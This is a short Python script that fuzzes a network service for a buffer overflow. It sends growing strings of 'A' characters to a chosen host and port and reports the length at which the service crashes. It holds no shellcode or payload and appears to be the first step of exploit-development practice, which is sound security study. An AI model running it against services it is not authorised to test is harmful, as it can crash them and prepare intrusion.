import socket
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', required=True)
parser.add_argument('-p', '--port', type=int, required=True)
args = parser.parse_args()

i = 100
buffer = ''

while True:
    buffer += 'A' * i

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        s.connect((args.target, args.port))
        s.recv(1024)
    except:
        print(f"[*] Crashed with 'A' * {len(buffer) - i}")
        exit()

    print(f"[i] Sending 'A' * {len(buffer)}")
    s.send((buffer + '\r\n').encode())
    s.close()
